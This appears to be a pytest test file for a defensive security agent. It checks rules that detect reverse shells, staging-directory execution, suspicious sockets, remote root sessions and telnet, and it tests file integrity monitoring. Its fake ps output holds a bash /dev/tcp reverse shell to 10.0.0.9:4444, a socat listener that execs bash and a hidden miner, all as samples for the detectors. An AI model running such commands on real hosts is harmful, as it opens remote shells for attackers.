"""Runtime/live-system layer: ingestor, threat rules, FIM, monitor tick."""
import pytest

from virgent.capabilities.runtime import (
    RuntimeInspectionCapability,
    check_connections,
    check_processes,
    check_services,
    check_sessions,
)
from virgent.engine import SecurityAgent
from virgent.ingest.runtime import ALLOWED_COMMANDS, RuntimeIngestor, _default_runner
from virgent.models import Actor, Severity

ACTOR = Actor(id="test", type="system")

PS_OUTPUT = """# ps -eo pid,user,comm,args --no-headers
  101 root     bash     bash -i >& /dev/tcp/10.0.0.9/4444 0>&1
  202 www-data python3  python3 /tmp/.x/miner.py --stealth
  303 root     socat    socat TCP-LISTEN:9999 EXEC:/bin/bash
  404 alice    vim      vim notes.txt
"""

SS_OUTPUT = """# ss -tunp
tcp ESTAB 0 0 10.0.0.5:44001 10.0.0.9:4444 users:(("bash",pid=101,fd=3))
tcp ESTAB 0 0 10.0.0.5:22 10.0.0.2:51000 users:(("sshd",pid=50,fd=4))
"""

WHO_OUTPUT = "# who\nroot     pts/0    2026-07-03 21:00 (10.0.0.2)\nalice    tty1     2026-07-03 08:00\n"

SERVICES_OUTPUT = "# systemctl ...\ntelnet.socket loaded active running Telnet Server\nssh.service loaded active running OpenSSH\n"


def fake_runtime_ingestor():
    outputs = {
        ("ps", "-eo", "pid,user,comm,args", "--no-headers"): PS_OUTPUT.split("\n", 1)[1],
        ("ss", "-tunp"): SS_OUTPUT.split("\n", 1)[1],
        ("who",): WHO_OUTPUT.split("\n", 1)[1],
        ("systemctl", "list-units", "--type=service", "--state=running", "--no-legend", "--no-pager"):
            SERVICES_OUTPUT.split("\n", 1)[1],
    }
    return RuntimeIngestor(runner=lambda argv: outputs.get(tuple(argv)), hostname="live-host")


def test_runner_allowlist():
    assert _default_runner(["curl", "evil.sh"]) is None
    assert ("who",) in ALLOWED_COMMANDS


def test_ingestor_snapshots():
    items = list(fake_runtime_ingestor().collect())
    facts = {i.metadata["fact"] for i in items}
    assert facts == {"processes", "connections", "sessions", "services"}
    assert all(i.kind == "runtime-fact" for i in items)


def test_process_rules_detect_revshell_and_staging():
    issues = check_processes(PS_OUTPUT)
    rules = {i["rule"] for i in issues}
    assert "proc-reverse-shell" in rules      # bash /dev/tcp and socat exec
    assert "proc-staging-dir-exec" in rules    # python from /tmp/.x
    crit = [i for i in issues if i["rule"] == "proc-reverse-shell"]
    assert all(i["severity"] == Severity.CRITICAL for i in crit)
    assert len(crit) >= 2


def test_connection_rule_flags_shell_socket():
    issues = check_connections(SS_OUTPUT)
    assert any(i["rule"] == "conn-suspicious-process" for i in issues)  # bash holds a socket
    # sshd holding a socket is normal and must not be flagged
    assert not any("sshd" in i["title"] for i in issues)


def test_session_rule_flags_remote_root():
    issues = check_sessions(WHO_OUTPUT)
    assert any(i["rule"] == "session-remote-root" for i in issues)
    assert all(i["severity"] == Severity.MEDIUM for i in issues)


def test_service_rule_flags_telnet():
    issues = check_services(SERVICES_OUTPUT)
    assert any(i["rule"] == "service-risky-telnet" for i in issues)
    assert not any("ssh" in i["title"].lower() for i in issues)


def test_runtime_capability_e2e(tmp_path):
    agent = SecurityAgent(workdir=tmp_path / "wd", actor=ACTOR)
    agent.ingestors["runtime"] = fake_runtime_ingestor()
    agent.ingest("localhost", ingestor="runtime")
    findings = agent.scan(capabilities=["runtime"])
    rules = {f.metadata["rule"] for f in findings}
    assert "proc-reverse-shell" in rules
    assert "service-risky-telnet" in rules
    actions = [r["action"] for r in agent.audit.iter_records()]
    assert "collect.runtime" in actions
    assert "scan.runtime" in actions
    assert agent.verify_audit().ok
    # controls include system-monitoring
    all_controls = {c for f in findings for c in f.controls}
    assert "NIST:SI-4" in all_controls


# -- file integrity monitoring ------------------------------------------------

def test_fim_baseline_and_detect_change(tmp_path):
    agent = SecurityAgent(workdir=tmp_path / "wd", actor=ACTOR)
    target = tmp_path / "critical.conf"
    target.write_text("trusted contents\n")
    summary = agent.integrity_baseline([str(target)])
    assert summary["recorded"] == 1
    assert agent.integrity_check() == []          # unchanged

    target.write_text("tampered!\n")
    changes = agent.integrity_check()
    assert len(changes) == 1
    assert changes[0].metadata["status"] == "modified"
    assert changes[0].severity == Severity.HIGH
    assert "NIST:SI-7" in changes[0].controls

    target.unlink()
    removed = agent.integrity_check()
    assert removed[0].metadata["status"] == "removed"

    actions = [r["action"] for r in agent.audit.iter_records()]
    assert "fim.baseline" in actions
    assert actions.count("fim.check") == 3


# -- continuous monitoring ----------------------------------------------------

def test_monitor_tick_dedup(tmp_path):
    agent = SecurityAgent(workdir=tmp_path / "wd", actor=ACTOR)
    agent.ingestors["runtime"] = fake_runtime_ingestor()
    # avoid noise from the real host in this deterministic test
    first = agent.monitor_tick(capabilities=["runtime"])
    assert first
    fps_first = {f.fingerprint for f in first}
    second = agent.monitor_tick(capabilities=["runtime"])
    fps_second = {f.fingerprint for f in second}
    # same live state -> identical fingerprints (a monitor dedups these)
    assert fps_first == fps_second
    ticks = [r for r in agent.audit.iter_records() if r["action"] == "monitor.tick"]
    assert len(ticks) == 2
    assert agent.verify_audit().ok
